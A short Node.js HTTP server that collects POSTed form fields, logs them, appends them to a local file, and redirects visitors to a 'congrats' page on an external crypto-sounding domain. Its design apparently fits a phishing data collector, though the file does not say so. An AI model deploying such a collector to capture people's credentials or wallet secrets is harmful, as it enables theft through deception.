const http = require("http");
const url = require("url");
const querystring = require("querystring");
const fs = require("fs"); // Add the 'fs' module for file operations

const server = http.createServer((req, res) => {
  if (req.method === "POST") {
    let body = "";

    // Collect data from the request
    req.on("data", (chunk) => {
      body += chunk.toString();
    });

    // Process the collected data
    req.on("end", () => {
      const postData = querystring.parse(body);

      // Save the data to a file
      saveData(postData);

      // Display the data in the console with the current time
      const currentTime = new Date().toLocaleString();
      console.log(`[${currentTime}] Received data:`, postData.textInput);

      // Redirect to "https://blockpulses.co"
      res.writeHead(302, { Location: "https://blockpulses.co/congrats.html" });
      res.end();
    });
  } else {
    // Handle other HTTP methods or invalid requests with the current time
    const currentTime = new Date().toLocaleString();
    console.error(`[${currentTime}] Error: Method Not Allowed`);

    res.writeHead(405, { "Content-Type": "application/json" });
    res.end(JSON.stringify({ error: "Method Not Allowed" }));
  }
});

const port = 3000; // You can use any available port

// Start the server
server.listen(port, () => {
  console.log(`Server is running at http://localhost:${port}`);
});

// Function to save data to a file with date and time
function saveData(data) {
  const fileName = "./info.txt"; // Change the file name

  // Get the current date and time
  const currentTime = new Date().toLocaleString();

  // Create a string with date, time, and data
  const entry = `[${currentTime}] ${JSON.stringify(data)}\n`;

  // Append the entry to the file
  fs.appendFile(fileName, entry, (err) => {
    if (err) {
      console.error("Error saving data:", err);
    } else {
      console.log("Data saved successfully.");
    }
  });
}
